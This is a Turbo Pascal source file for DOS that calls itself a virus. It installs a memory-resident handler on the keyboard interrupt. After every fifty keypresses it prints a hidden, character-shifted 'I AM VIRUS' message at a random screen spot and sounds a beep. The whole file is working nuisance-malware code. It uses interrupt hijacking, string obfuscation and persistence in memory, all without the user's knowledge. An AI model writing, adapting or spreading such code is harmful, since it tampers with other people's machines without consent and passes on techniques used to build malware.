program keep1_as_virus_M_S_S;
{ writeing in the virus mr.saleh}
{$M $500,0,0 }   { 2K stack, no heap }
uses Crt, Dos;
CONST
     a1: array [1..28] of char =(chr(28),(chr(ord('I')+1)),(chr(ord(#32)+1))
     ,(chr(ord('A')+1)),(chr(ord('M')+1)),(chr(ord(' ')+1)),(chr(ord('V')+1))
     ,(chr(ord('I')+1)),(chr(ord('R')+1)),(chr(ord('U')+1)),(chr(ord('S')+1))
     ,(chr(ord(' ')+1)),(chr(ord('A')+1)),(chr(ord('S')+1)),(chr(ord('K')+1))
     ,(chr(ord('A')+1)),(chr(ord('R')+1)),(chr(ord('E')+1)),(chr(ord('S')+1))
     ,(chr(ord(' ')+1)),(chr(ord('V')+1)),(chr(ord('1')+1)),(chr(ord('.')+1))
     ,(chr(ord('1')+1)),(chr(ord('.')+1)),(chr(ord('.')+1)),(chr(ord('!')+1))
     ,(chr(ord('?')+1)));
var
   S              : string[28] absolute a1;
   KbdIntVec      : Procedure;
   sum,segC, OfsC : Word;
   I,EndStr       : Byte;
   v              :string[30];
procedure vv ( X, Y : ShortInt; BG, FG : Byte; Const S : String );
var
   SegC, OfsC : Word;
   I, EndStr  : Byte;
begin
     SegC   := $B800;
     OfsC   := ( Y - 1 ) * 160 + X * 2 - 2;
     EndStr := Ord ( S[0] );
     For I  := 1 To EndStr Do
         Begin
              MemW[SegC:OfsC] := ( BG ShL 4 + FG ) ShL 8 + Ord ( S[i] );
              Inc ( OfsC, 2 );
         End;
end;
{$F+}
procedure Keyclick; interrupt;
var
   q,z:byte;
begin
     if Port[$60] < $80 then sum:=sum+1;
     if sum = 50  then
        begin
             q :=random(61);
             z :=random(24);
             VV ( q, z,0 ,7, v );
             sound(200);
             delay (50);
             nosound;
             sum:=0;
        end;
     inline ($9C);
     KbdIntVec;
end;
{$F-}
begin
     for i:=1 to length(s) do
         begin
              s[i]:= char(ord(s[i])-1);
              v:=v+s[i];
         end;
     randomize;
     GetIntVec($9,@KbdIntVec);
     SetIntVec($9,Addr(Keyclick));
     Keep(0);
end.
